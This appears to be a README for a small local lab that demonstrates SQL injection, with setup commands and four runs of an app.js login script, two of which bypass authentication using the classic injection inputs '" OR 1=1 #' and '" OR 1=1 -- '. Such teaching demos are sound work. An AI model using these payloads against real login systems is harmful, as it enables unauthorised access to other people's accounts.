# SQL injection

## setup

run commands:

- `cd sql-injection`
- `npm install`
- `mysql -h 127.0.0.1 -u root -pddd < injection.sql`

## run app

- pass login with right user and password, `./app.js wd 123`
- fail login with right user and error pwd, `./app.js wd 333`
- pass loing with injection, `./app.js '" OR 1=1 #' abc`
- pass loing with injection, `./app.js '" OR 1=1 -- ' abc`
